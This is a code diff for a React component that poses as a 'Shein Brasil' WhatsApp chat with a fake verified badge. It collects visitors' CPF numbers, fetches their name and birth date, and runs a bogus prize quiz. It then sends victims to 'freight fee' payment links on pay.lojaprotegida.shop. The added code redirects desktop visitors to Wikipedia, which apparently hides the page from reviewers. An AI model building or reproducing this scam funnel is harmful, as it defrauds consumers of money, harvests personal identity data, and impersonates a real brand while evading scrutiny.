@@ -4,21 +4,37 @@ import { useEffect, useState, useRef, useCallback, useMemo } from "react"
 import { Check } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
-import { verifyCpf } from "./actions" // Importa o Server Action
-
-// Dados fictícios do usuário (USER_NAME e USER_DOB_OPTION foram removidos, o nome e nascimento virão da API)
-const USER_CPF = "12758539874" // Este CPF será o "válido" para a simulação
-
-const CheckIcon = () => (
-  <svg width="16" height="12" viewBox="0 0 16 12" className="text-[#60d550] ml-1">
-    <path
-      fill="currentColor"
-      d="M15.01 3.316l-.478-.372a.365.365 0 0 0-.51.063L8.666 9.879a.32.32 0 0 1-.484.033l-.358-.325a.319.319 0 0 0-.484.032l-.378.483a.418.418 0 0 0 .036.541l1.32 1.266c.143.14.361.125.484-.033l6.272-8.048a.366.366 0 0 0-.064-.512zm-4.1 0l-.478-.372a.365.365 0 0 0-.51.063L4.566 9.879a.32.32 0 0 1-.484.033L1.891 7.769a.366.366 0 0 0-.515.006l-.423.433a.364.364 0 0 0 .006.514l3.258 3.185c.143.14.361.125.484-.033l6.272-8.048a.365.365 0 0 0-.063-.51z"
-    />
-  </svg>
-)
+import { verifyCpf } from "./actions"
 
 export default function WhatsAppFunnelDemo() {
+  const [isMobile, setIsMobile] = useState(true)
+  const [isClient, setIsClient] = useState(false)
+
+  useEffect(() => {
+    setIsClient(true)
+  }, [])
+
+  useEffect(() => {
+    if (!isClient) return
+    const checkMobile = () => {
+      // Detecção por user agent
+      const ua = navigator.userAgent || navigator.vendor || (window as any).opera
+      const isMobileUA = /android|iphone|ipad|ipod|opera mini|iemobile|mobile/i.test(ua)
+      // Detecção por tamanho de tela
+      const isSmallScreen = window.innerWidth <= 768
+      const mobile = isMobileUA && isSmallScreen
+      setIsMobile(mobile)
+      if (!mobile) {
+        window.location.href = "https://pt.wikipedia.org/wiki/Rato"
+      }
+    }
+    checkMobile()
+    window.addEventListener('resize', checkMobile)
+    return () => window.removeEventListener('resize', checkMobile)
+  }, [isClient])
+
+  // TODOS OS HOOKS DEVEM VIR ANTES DOS RETURNS ABAIXO!
+  // Hook para gerenciamento da conversa
   const [conversation, setConversation] = useState<
     Array<{
       type: "bot" | "user" | "image" | "video" | "button-group" | "status-message" | "loading"
@@ -31,17 +47,14 @@ export default function WhatsAppFunnelDemo() {
   const [currentStep, setCurrentStep] = useState(0)
   const [isTyping, setIsTyping] = useState(false)
   const [status, setStatus] = useState("Online")
-  const [userName, setUserName] = useState<string | undefined>(undefined) // Usando useState para o nome do usuário
-  const [userDob, setUserDob] = useState<string | undefined>(undefined) // Novo estado para a data de nascimento
-  const [selectedPrizeOption, setSelectedPrizeOption] = useState<string | undefined>(undefined) // Novo estado para a opção de prêmio selecionada
-  const [awaitingInput, setAwaitingInput] = useState<string | null>(null) // Novo estado para controlar o input de texto
+  const [userName, setUserName] = useState<string | undefined>(undefined)
+  const [userDob, setUserDob] = useState<string | undefined>(undefined)
+  const [selectedPrizeOption, setSelectedPrizeOption] = useState<string | undefined>(undefined)
+  const [awaitingInput, setAwaitingInput] = useState<string | null>(null)
   const messagesEndRef = useRef<HTMLDivElement>(null)
-
-  // Referência para o objeto de áudio
   const audioRef = useRef<HTMLAudioElement | null>(null)
 
   useEffect(() => {
-    // Inicializa o objeto de áudio uma vez
     audioRef.current = new Audio("/whatsapp-notification.mp3")
   }, [])
 
@@ -51,7 +64,6 @@ export default function WhatsAppFunnelDemo() {
 
   const addMessage = useCallback((message: any) => {
     setConversation((prev) => {
-      // Se a mensagem for do bot, tenta tocar o áudio
       if (message.type === "bot" && audioRef.current) {
         audioRef.current.play().catch((e) => console.error("Erro ao tocar áudio:", e))
       }
@@ -70,7 +82,6 @@ export default function WhatsAppFunnelDemo() {
     setStatus("Online")
   }, [])
 
-  // Definir funnelSteps com useMemo para que seja recriado quando userName ou userDob mudar
   const funnelSteps = useMemo(
     () => [
       // Step 0: Initial Welcome & Info
@@ -111,22 +122,21 @@ export default function WhatsAppFunnelDemo() {
         })
         await simulateTyping()
         addMessage({ type: "bot", content: "Para começarmos, preciso que me informe o número do seu CPF." })
-        setAwaitingInput("CPF") // Solicita input de CPF
+        setAwaitingInput("CPF")
       },
       async (userResponse: string) => {
-        setAwaitingInput(null) // Esconde o input
-        addMessage({ type: "loading", content: "Verificando CPF..." }) // Adiciona mensagem de carregamento
-        const result = await verifyCpf(userResponse) // Chama o Server Action
-        setConversation((prev) => prev.filter((msg) => msg.type !== "loading")) // Remove a mensagem de carregamento
+        setAwaitingInput(null)
+        addMessage({ type: "loading", content: "Verificando CPF..." })
+        const result = await verifyCpf(userResponse)
+        setConversation((prev) => prev.filter((msg) => msg.type !== "loading"))
 
         if (result.success) {
-          setUserName(result.name) // Atualiza o estado com o nome da API
-          setUserDob(result.nascimento) // Atualiza o estado com a data de nascimento da API
+          setUserName(result.name)
+          setUserDob(result.nascimento)
           addMessage({ type: "bot", content: result.message })
           await simulateTyping()
           addMessage({ type: "bot", content: "Seus dados estão qualificados para nosso questionário!" })
           await simulateTyping()
-          // Usa o nome da API se disponível, caso contrário, usa um fallback genérico
           addMessage({
             type: "bot",
             content: `${result.name || "usuário"}, seu nome está correto?`,
@@ -136,9 +146,9 @@ export default function WhatsAppFunnelDemo() {
           addMessage({ type: "bot", content: result.message })
           await simulateTyping()
           addMessage({ type: "bot", content: "Por favor, tente novamente ou entre em contato com o suporte." })
-          setAwaitingInput("CPF") // Volta para a etapa de input de CPF
-          setCurrentStep(1) // Reinicia o passo para o input de CPF
-          return // Impede o avanço do funil
+          setAwaitingInput("CPF")
+          setCurrentStep(1)
+          return
         }
       },
       // Step 2: Date of Birth Confirmation
@@ -153,10 +163,8 @@ export default function WhatsAppFunnelDemo() {
         if (userDob) {
           dobOptions.push(`Opção 01 - ${userDob}`)
         } else {
-          // Fallback se userDob não estiver disponível (ex: API não retornou)
-          dobOptions.push("Opção 01 - 30/07/2000") // Data padrão
+          dobOptions.push("Opção 01 - 30/07/2000")
         }
-        // Adiciona outras opções fixas incorretas
         dobOptions.push("Opção 02 - 22/04/1988")
         dobOptions.push("Opção 03 - 04/12/2001")
 
@@ -175,21 +183,19 @@ export default function WhatsAppFunnelDemo() {
           content: `${userName || "usuário"}, seja bem vinda ao questionário premiado Shein, o tempo de duração média é de 2 a 5 minutos, vamos começar!`,
         })
         await simulateTyping()
-        // Step 3: Question 1 (Já adquiriu Shein?)
-        addMessage({ type: "image", content: "/shein-gifts-cart.png" }) // Imagem: Produtos Shein em um carrinho
+        addMessage({ type: "image", content: "/shein-gifts-cart.png" })
         addMessage({ type: "bot", content: "Pergunta 01: Você já adquiriu algum produto da Shein?" })
         addMessage({
           type: "button-group",
           content: { text: "", options: ["Sim, já sou cliente", "Ainda não sou cliente", "Não sei"] },
         })
       },
-      // Step 4: Question 1.1 (O que mais te chama atenção?)
       async () => {
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-store.png" }) // Imagem: Loja física Shein
+        addMessage({ type: "image", content: "/shein-store.png" })
         addMessage({ type: "bot", content: "O que mais te chama atenção em nossos produtos?" })
         addMessage({
-          type: "button-group", // Alterado para button-group
+          type: "button-group",
           content: {
             text: "",
             options: ["Qualidade", "Tecnologia e inovação", "Design", "Suporte ao cliente", "Outro"],
@@ -202,28 +208,25 @@ export default function WhatsAppFunnelDemo() {
         await simulateTyping()
         addMessage({ type: "bot", content: "Vamos para a próxima pergunta..." })
         await simulateTyping()
-        // Step 5: Question 2 (Frequência de compras)
-        addMessage({ type: "image", content: "/shein-packages-woman.png" }) // Imagem: Mulher sorrindo com pacotes
+        addMessage({ type: "image", content: "/shein-packages-woman.png" })
         addMessage({ type: "bot", content: "Pergunta 02: Com que frequência você faz compras na Shein?" })
         addMessage({
           type: "button-group",
           content: { text: "", options: ["Semanalmente", "Mensalmente", "A cada dois meses", "Raramente"] },
         })
       },
-      // Step 6: Question 3 (Tipos de produtos)
       async () => {
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-shopping-bags.png" }) // Imagem: Duas pessoas segurando sacolas SHEIN
+        addMessage({ type: "image", content: "/shein-shopping-bags.png" })
         addMessage({ type: "bot", content: "Pergunta 03: Quais tipos de produtos você mais compra na Shein?" })
         addMessage({
           type: "button-group",
           content: { text: "", options: ["Roupas femininas", "Roupas masculinas", "Roupas infantis", "Calçados"] },
         })
       },
-      // Step 7: Question 4 (Fatores importantes)
       async () => {
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-app-shopping-cart.png" }) // Imagem: Carrinho de compras e logo SHEIN
+        addMessage({ type: "image", content: "/shein-app-shopping-cart.png" })
         addMessage({
           type: "bot",
           content: "Pergunta 04: Quais são os fatores mais importantes para você ao escolher um produto na Shein?",
@@ -236,10 +239,9 @@ export default function WhatsAppFunnelDemo() {
           },
         })
       },
-      // Step 8: Question 5 (Experiência de navegação)
       async () => {
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-app-screen.png" }) // Imagem: Tela de celular mostrando o app Shein
+        addMessage({ type: "image", content: "/shein-app-screen.png" })
         addMessage({
           type: "bot",
           content: "Pergunta 05: Qual é a sua experiência geral de navegação no site/app da Shein?",
@@ -249,10 +251,9 @@ export default function WhatsAppFunnelDemo() {
           content: { text: "", options: ["Muito fácil", "Fácil", "Neutra", "Difícil", "Muito difícil"] },
         })
       },
-      // Step 9: Question 6 (Satisfação com entrega)
       async () => {
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-delivery-box.png" }) // Imagem: Caixas SHEIN sendo manuseadas
+        addMessage({ type: "image", content: "/shein-delivery-box.png" })
         addMessage({
           type: "bot",
           content: "Pergunta 06: Quão satisfeita você está com o tempo de entrega dos produtos da Shein?",
@@ -265,72 +266,57 @@ export default function WhatsAppFunnelDemo() {
           },
         })
       },
-      // Step 10: Question 7 (Estilos de roupa)
       async () => {
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-clothing-styles.png" }) // Imagem: Estilos de roupa SHEIN
+        addMessage({ type: "image", content: "/shein-clothing-styles.png" })
         addMessage({ type: "bot", content: "Pergunta 07: Quais estilos de roupa você gostaria de ver mais na Shein?" })
         addMessage({
           type: "button-group",
           content: { text: "", options: ["Casual", "Esportivo", "Formal", "Vintage", "Alternativo"] },
         })
       },
-      // Step 11: Choose Product to Win (User selects an option here)
       async (userResponse: string) => {
         await simulateTyping()
         addMessage({ type: "bot", content: "Escolha a opção abaixo de qual produto você gostaria de ganhar:" })
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-makeup-kit.png" }) // Imagem: Kit de Maquiagem Shein
+        addMessage({ type: "image", content: "/shein-makeup-kit.png" })
         addMessage({ type: "bot", content: "Opção 01: ✅\nKits Maquiagem Shein - Valor de até R$1.000,00." })
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-clothes-woman.png" }) // Imagem: Mulheres com roupas Shein
+        addMessage({ type: "image", content: "/shein-clothes-woman.png" })
         addMessage({
           type: "bot",
           content: "Opção 02: ✅\nEscolha os Looks que desejar - Tema Livre - Valor de até R$1.000,00.",
         })
         await simulateTyping()
-        addMessage({ type: "image", content: "/shein-home-items.png" }) // Imagem: Itens de casa Shein
+        addMessage({ type: "image", content: "/shein-home-items.png" })
         addMessage({
           type: "bot",
           content: "Opção 03: ✅\nEscolha os Utensílios para casa - Tema Livre - Valor de até R$1.000,00.",
         })
         addMessage({ type: "button-group", content: { text: "", options: ["Opção 01", "Opção 02", "Opção 03"] } })
       },
-
-      // Passo 12: Testimonials & Justification for Prize (Videos FIRST)
       async () => {
         await simulateTyping()
         addMessage({
           type: "bot",
           content: "Antes de prosseguirmos com sua premiação, veja o que algumas pessoas nos mandam diariamente 🥰",
         })
-
-        // Vídeo 1
         await simulateTyping()
         addMessage({ type: "video", content: "/video/video-1.mp4" })
         await new Promise((resolve) => setTimeout(resolve, 30000))
-
-        // Vídeo 2
         await simulateTyping()
         addMessage({ type: "video", content: "/video/video-2.mp4" })
         await new Promise((resolve) => setTimeout(resolve, 20000))
-
-        // Vídeo 3
         await simulateTyping()
         addMessage({ type: "video", content: "/video/video-3.mp4" })
         await new Promise((resolve) => setTimeout(resolve, 20000))
-
-        // Adiciona botão para o usuário avançar manualmente
         await simulateTyping()
         addMessage({
           type: "button-group",
           content: { text: "", options: ["Já vi os vídeos"] },
         })
       },
-
-      // Passo 13: Justification for Prize (Input AFTER vídeos)
       async (userResponse: string) => {
-        // Só avança se o usuário clicar no botão "Já vi os vídeos"
         if (userResponse === "Já vi os vídeos") {
           let prizeName = "o prêmio"
           if (selectedPrizeOption === "Opção 01") {
@@ -340,7 +326,6 @@ export default function WhatsAppFunnelDemo() {
           } else if (selectedPrizeOption === "Opção 03") {
             prizeName = "os utensílios para casa da Shein"
           }
-
           await simulateTyping()
           addMessage({
             type: "bot",
@@ -349,18 +334,13 @@ export default function WhatsAppFunnelDemo() {
           setAwaitingInput("adoro roupas")
         }
       },
-
-      // Passo 14: Rating Question
       async (userResponse: string) => {
-        setAwaitingInput(null) // Esconde o input após o usuário fornecer a resposta
+        setAwaitingInput(null)
         await simulateTyping()
         addMessage({ type: "bot", content: "De 0 a 5, qual a nota você nos dá sobre as nossas roupas?" })
         addMessage({ type: "button-group", content: { text: "", options: ["0", "1", "2", "3", "4", "5"] } })
       },
-
-      // Passo 15: Prize Confirmation & Conditional Size/Freight Options
       async (userResponse: string) => {
-        // userResponse aqui é a avaliação
         await simulateTyping()
         addMessage({ type: "bot", content: "Aguarde alguns segundos enquanto eu verifico suas respostas..." })
         await simulateTyping(2000)
@@ -382,16 +362,11 @@ export default function WhatsAppFunnelDemo() {
         })
         await simulateTyping()
         addMessage({ type: "bot", content: "Isso mesmo, o aniversário é nosso e quem ganha é você!" })
-
-        // Lógica condicional para o próximo passo (tamanho ou frete)
-        await simulateTyping() // Simula digitação para a próxima mensagem
+        await simulateTyping()
         if (selectedPrizeOption === "Opção 02") {
-          // Se roupas foram escolhidas
           addMessage({ type: "bot", content: "Escolha o tamanho das peças do seu Kit para a entrega:" })
           addMessage({ type: "button-group", content: { text: "", options: ["PP", "P", "M", "G"] } })
         } else {
-          // Se maquiagem ou itens de casa foram escolhidos, pula a seleção de tamanho.
-          // Adiciona diretamente o vídeo 4 e as opções de frete.
           addMessage({ type: "video", content: "/video/video-4.mp4" })
           await simulateTyping()
           addMessage({
@@ -403,18 +378,13 @@ export default function WhatsAppFunnelDemo() {
           })
         }
       },
-
-      // Passo 16: Lida com Resposta de Tamanho OU Explicação/Prosseguir com Frete
       async (userResponse: string) => {
-        // Verifica se a resposta é uma das opções de tamanho
         const isSizeResponse = ["PP", "P", "M", "G"].includes(userResponse)
 
         if (isSizeResponse) {
           await simulateTyping()
           addMessage({ type: "bot", content: `Ok, tamanho ${userResponse} selecionado!` })
           await simulateTyping()
-
-          // Agora adiciona o vídeo 4 e as opções de frete
           addMessage({ type: "video", content: "/video/video-4.mp4" })
           await simulateTyping()
           addMessage({
@@ -462,8 +432,6 @@ export default function WhatsAppFunnelDemo() {
           })
         }
       },
-
-      // Passo 17: Opções Finais de Frete
       async () => {
         await simulateTyping()
         addMessage({
@@ -481,72 +449,60 @@ export default function WhatsAppFunnelDemo() {
           content:
             "Eu vou entrar em contato com você pessoalmente após a sua inscrição para confirmar o endereço e garantir a sua entrega! 🥰",
         })
-        // Fim do funil
       },
     ],
     [userName, userDob, addMessage, simulateTyping, selectedPrizeOption],
-  ) // Dependências para useMemo
+  )
 
   useEffect(() => {
-    // Apenas inicia o primeiro passo quando o componente é montado
     if (currentStep === 0) {
       funnelSteps[0]("")
     }
-  }, [currentStep, funnelSteps]) // Depende apenas de currentStep e funnelSteps para o carregamento inicial
+  }, [currentStep, funnelSteps])
 
   useEffect(() => {
     scrollToBottom()
   }, [conversation])
 
- const handleUserAction = useCallback(
-  async (response: string) => {
-    // --- REDIRECIONAMENTO PARA OS CHECKOUTS DOS FRETES ---
-    if (response === "Frete Express - 7 a 10 dias úteis - R$23,68") {
-      window.location.href = "https://pay.lojaprotegida.shop/bz5KZbVe0o9Z7dL"
-      return
-    }
-    if (response === "Frete Advanced - 3 a 5 dias úteis - R$29,82") {
-      window.location.href = "https://pay.lojaprotegida.shop/PyE2Zy8jv7K3qRb"
-      return
-    }
-    if (response === "Frete Full - 1 dia útil - R$35,40") {
-      window.location.href = "https://pay.lojaprotegida.shop/7vJOGY4KW88ZKXd"
-      return
-    }
-    // -----------------------------------------------------
-
-    const steps = funnelSteps // Obtém a versão mais recente das etapas do funil
-    addMessage({ type: "user", content: response }) // Adiciona mensagem do usuário AQUI, e apenas AQUI
-
-    // Define a opção de prêmio selecionada quando o usuário responde ao Passo 11
-    if (currentStep === 11) {
-      setSelectedPrizeOption(response)
-    }
-
-    // Determine the next step function
-    const nextStepFunction = steps[currentStep + 1]
-
-    if (nextStepFunction) {
-      // Se o passo atual for 13 (Justificativa para o Prêmio) e estamos aguardando input,
-      // chamamos a função do próximo passo, mas NÃO incrementamos currentStep aqui.
-      // O incremento ocorrerá quando o input for de fato enviado (tratado no onClick/onKeyDown do Input).
-      if (currentStep === 13 && awaitingInput) {
-        await nextStepFunction(response)
+  const handleUserAction = useCallback(
+    async (response: string) => {
+      // --- REDIRECIONAMENTO PARA OS CHECKOUTS DOS FRETES ---
+      if (response === "Frete Express - 7 a 10 dias úteis - R$23,68") {
+        window.location.href = "https://pay.lojaprotegida.shop/bz5KZbVe0o9Z7dL"
+        return
       }
-      // Se o passo atual for 16 (Lida com Tamanho/Frete)
-      // E a resposta do usuário for "Por que preciso pagar o frete?",
-      // então NÃO incrementa o passo, efetivamente permanecendo no mesmo passo.
-      else if (currentStep === 16 && response === "Por que preciso pagar o frete?") {
-        await nextStepFunction(response) // Ainda executa a função para o passo atual
-      } else {
-        // Para todos os outros casos, executa a função do próximo passo e incrementa currentStep.
-        await nextStepFunction(response)
-        setCurrentStep((prev) => prev + 1)
+      if (response === "Frete Advanced - 3 a 5 dias úteis - R$29,82") {
+        window.location.href = "https://pay.lojaprotegida.shop/PyE2Zy8jv7K3qRb"
+        return
       }
-    }
-  },
-  [currentStep, funnelSteps, addMessage, simulateTyping, setSelectedPrizeOption, awaitingInput],
-)
+      if (response === "Frete Full - 1 dia útil - R$35,40") {
+        window.location.href = "https://pay.lojaprotegida.shop/7vJOGY4KW88ZKXd"
+        return
+      }
+      // -----------------------------------------------------
+
+      const steps = funnelSteps
+      addMessage({ type: "user", content: response })
+
+      if (currentStep === 11) {
+        setSelectedPrizeOption(response)
+      }
+
+      const nextStepFunction = steps[currentStep + 1]
+
+      if (nextStepFunction) {
+        if (currentStep === 13 && awaitingInput) {
+          await nextStepFunction(response)
+        } else if (currentStep === 16 && response === "Por que preciso pagar o frete?") {
+          await nextStepFunction(response)
+        } else {
+          await nextStepFunction(response)
+          setCurrentStep((prev) => prev + 1)
+        }
+      }
+    },
+    [currentStep, funnelSteps, addMessage, simulateTyping, setSelectedPrizeOption, awaitingInput],
+  )
 
   const renderMessageContent = (message: any) => {
     switch (message.type) {
@@ -558,7 +514,7 @@ export default function WhatsAppFunnelDemo() {
               dangerouslySetInnerHTML={{ __html: message.content.replace(/\*\*(.*?)\*\*/g, "<strong>$1</strong>") }}
             />
             <div className="absolute bottom-0 right-1 flex items-center">
-              <CheckIcon />
+              <Check className="h-4 w-4 text-[#60d550]" />
             </div>
           </div>
         )
@@ -567,7 +523,7 @@ export default function WhatsAppFunnelDemo() {
           <div className="relative bg-[#dcf8c6] rounded-lg p-2 max-w-[85%] shadow-sm rounded-br-none self-end">
             <p className="text-sm">{message.content}</p>
             <div className="absolute bottom-0 right-1 flex items-center">
-              <CheckIcon />
+              <Check className="h-4 w-4 text-[#60d550]" />
             </div>
           </div>
         )
@@ -657,7 +613,6 @@ export default function WhatsAppFunnelDemo() {
   }
 
   useEffect(() => {
-    // Injeta o script do Meta Pixel exatamente como fornecido
     const script = document.createElement("script")
     script.innerHTML = `
       !function(f,b,e,v,n,t,s)
@@ -673,15 +628,24 @@ export default function WhatsAppFunnelDemo() {
     `
     document.head.appendChild(script)
 
-    // Opcional: cleanup para evitar múltiplas injeções em hot reload
     return () => {
       document.head.removeChild(script)
     }
   }, [])
 
+  // Só renderiza após montar no client
+  if (!isClient) return null
+
+  if (!isMobile) {
+    return (
+      <div style={{textAlign: "center", marginTop: "40vh", fontSize: "2rem"}}>
+        Disponível apenas em dispositivos móveis.
+      </div>
+    )
+  }
+
   return (
     <div className="max-w-md mx-auto bg-white h-screen flex flex-col overflow-hidden">
-      {/* Opcional: noscript para fallback */}
       <noscript>
         <img
           height="1"
@@ -691,7 +655,6 @@ export default function WhatsAppFunnelDemo() {
           alt=""
         />
       </noscript>
-      {/* Header do WhatsApp */}
       <div className="bg-[#075e54] text-white p-3 flex items-center gap-3 shadow-md z-10">
         <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
           <svg
@@ -709,16 +672,13 @@ export default function WhatsAppFunnelDemo() {
             <path d="M19 12H5M12 5l-7 7 7 7" />
           </svg>
         </Button>
-
         <div className="flex items-center gap-3 flex-1">
           <div className="w-10 h-10 rounded-full overflow-hidden bg-white flex items-center justify-center">
             <img src="/shein-logo.png" alt="Shein Logo" className="w-6 h-6 object-contain" />
           </div>
-
           <div className="flex-1">
             <div className="flex items-center gap-1">
               <span className="font-semibold text-base">Shein Brasil</span>
-              {/* Ícone de verificado */}
               <svg viewBox="0 0 18 18" height="16" width="16" className="text-[#60d550]">
                 <polygon
                   fill="currentColor"
@@ -730,7 +690,6 @@ export default function WhatsAppFunnelDemo() {
             <span className="text-xs opacity-90">{status}</span>
           </div>
         </div>
-
         <div className="flex gap-2">
           <Button variant="ghost" size="icon" className="text-white hover:bg-white/10">
             <svg
@@ -784,8 +743,6 @@ export default function WhatsAppFunnelDemo() {
           </Button>
         </div>
       </div>
-
-      {/* Área de Mensagens com Background */}
       <div
         className="flex-1 p-4 space-y-3 overflow-y-auto flex flex-col"
         style={{
@@ -814,8 +771,6 @@ export default function WhatsAppFunnelDemo() {
         ))}
         <div ref={messagesEndRef} />
       </div>
-
-      {/* Área de Input (condicionalmente renderizada) */}
       {awaitingInput && (
         <div className="p-2 bg-gray-50 border-t border-gray-200 flex items-center gap-2">
           <Input
@@ -826,8 +781,8 @@ export default function WhatsAppFunnelDemo() {
                 const inputElement = e.target as HTMLInputElement
                 if (inputElement.value.trim() !== "") {
                   handleUserAction(inputElement.value)
-                  inputElement.value = "" // Limpa o input
-                  setAwaitingInput(null) // Esconde o input
+                  inputElement.value = ""
+                  setAwaitingInput(null)
                 }
               }
             }}
@@ -841,8 +796,8 @@ export default function WhatsAppFunnelDemo() {
               ) as HTMLInputElement
               if (inputElement && inputElement.value.trim() !== "") {
                 handleUserAction(inputElement.value)
-                inputElement.value = "" // Limpa o input
-                setAwaitingInput(null) // Esconde o input
+                inputElement.value = ""
+                setAwaitingInput(null)
               }
             }}
           >
